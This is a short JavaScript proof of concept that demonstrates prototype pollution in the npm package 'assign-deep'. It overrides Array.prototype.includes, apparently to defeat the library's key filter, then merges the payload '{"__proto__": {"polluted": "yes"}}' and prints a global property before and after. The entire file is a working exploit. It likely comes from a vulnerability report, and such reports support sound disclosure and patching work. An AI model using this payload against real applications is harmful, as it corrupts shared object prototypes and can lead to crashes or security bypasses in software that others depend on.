Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const assign = require('assign-deep');
const payloads = ['{"__proto__": {"polluted": "yes"}}'];
var obj = {};
console.log({}.polluted);
assign({}, JSON.parse(payloads[0]));
console.log({}.polluted);